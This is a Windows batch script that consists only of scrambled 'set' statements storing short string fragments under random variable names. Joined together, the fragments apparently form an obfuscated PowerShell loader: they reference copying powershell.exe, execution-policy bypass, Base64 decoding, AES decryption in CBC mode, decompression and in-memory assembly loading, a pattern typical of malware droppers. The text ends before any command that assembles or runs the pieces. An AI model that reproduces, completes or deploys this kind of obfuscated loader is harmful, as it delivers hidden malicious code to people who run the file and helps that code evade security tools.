@echo off
set "MVLBJKnHbZ=ll"
set "dlDjiiQlhw=nd"
set "oUFXxKutUV=st"
set "FoGfhvQQpn=.e"
set "AQKlZVuVCD=y "
set "eILcbDzLJJ=xe"
set "XgvvUPLqqU=ow"
set "cLTJhzWzfi=em"
set "zDeaZNsKzU=py"
set "EAuJvJSani=we"
set "MIdyOaAlUk=we"
set "EhbSxvIUel=in"
set "BSMOqzikmn=ll"
set "PqLznjMgcO= C"
set "fHCxUuxXIc=do"
set "hmJanYceeu=ws"
set "tEQKLAPSUw=he"
set "mKROJffNuv=:\"
set "hCDmKbgIGB=Sy"
set "kbaJZMdIKX=he"
set "aSaLAhStNo=1."
set "GUxIpvCiKT=32"
set "FjqqvLcVoq= /"
set "qbIEmsyaEz=rS"
set "IEpeeZBVOz=s\"
set "knOrbDuWHm=po"
set "QQPPLOckDP=Wi"
set "xQjTdzVoxk=\v"
set "yBKvGKmxjh=co"
set "AESKDySElT=Po"
set "IdJPFNYrGu=\W"
set "lIrxIyoUnN=0\"
set "GOxXbOyMkF=rs"
set "zsTPvHJzie= %~dp0"
set "uSGbFeRrUZ=cd"
set "jKGEOtuqHS=[Sys"
set "hclvHEspRR=lit("
set "lWoYDoMtDP=]::("
set "JRGWyfTfGt=kCD "
set "PWOlcKDdZd=V = "
set "UwNmSFYbMi=pose"
set "CpvoHdxVOc=;$iN"
set "UNxFMcnRCc=esMa"
set "TsxBVhuWAj=d;$e"
set "QNtesDXbRX=Mi, "
set "zIiUJPFWku=3); "
set "DaKPXTnUlk=rofi"
set "AkJxCuUYyQ=TllA"
set "tckztxWpcW=comp"
set "JpDONELKoQ=pHKF"
set "kinllhaSlU=EBLF"
set "qNEfQWfVSQ=.Ass"
set "NpSlIYAiys=ew-O"
set "JfVLNKvhWl=.-16"
set "QCMRRAZVXJ=ment"
set "KbcCXRCcAH=rtS4"
set "utMNVdWrnF=.Dis"
set "OJcUxrZOfV= '')"
set "fCnLtLZffz=nirt"
set "IbYiQjxSlr=urit"
set "oFRvFRThRK=join"
set "vdFyCHKSqG=;$qW"
set "dtqyrEIIvi=fore"
set "UKyzeOrsIS=Obje"
set "AFSHwvIREy=File"
set "teDUgpaCWZ=k = "
set "thpEdabKem=RiF."
set "pOvosZdIxm==');"
set "TJGEjQzLUM=FX ="
set "lIVINwDjuX=;$qW"
set "roRykjEwmT=('%*'"
set "HMlRGwsBuy=hy.A"
set "Eoxaxsgmap=6] -"
set "BycacbdEqg=ay()"
set "nwevluWTBp=bypa"
set "PMoJvWLXnN=, $E"
set "YrRptMcdjO=mzRi"
set "DJvvxrzJXf=Conv"
set "gPNlngKOlW=ct S"
set "FQPrPqGGfo=nage"
set "BrVUbQCIyr=Mode"
set "VLNCYObvZn=Vetp"
set "aNFVlMZWvn=stem"
set "rgxOqBHHMd= [Sy"
set "puovmsFbNB=ach "
set "HEHqcjKhGH=iNWM"
set "uULZTNVZBw=g = "
set "gKgwsEcjDu=onve"
set "eJixZWvelJ=k; }"
set "XTDubTvmYu=ck($"
set "AKiAcmOfAB=yste"
set "eaFjTfBEnj='0Pg"
set "TZaCXedXKB=pher"
set "JQNIcELaiO=Oiva"
set "WqkLNmbbSW=pHKF"
set "LmWMjkTMaM=F'[-"
set "qYLsLTXvZR=[-1."
set "REYwroPXwG=('Tg"
set "foZWHBiVZU=ose("
set "vHvQsDCjwB=[]] "
set "XzjqpZKQKD=]::N"
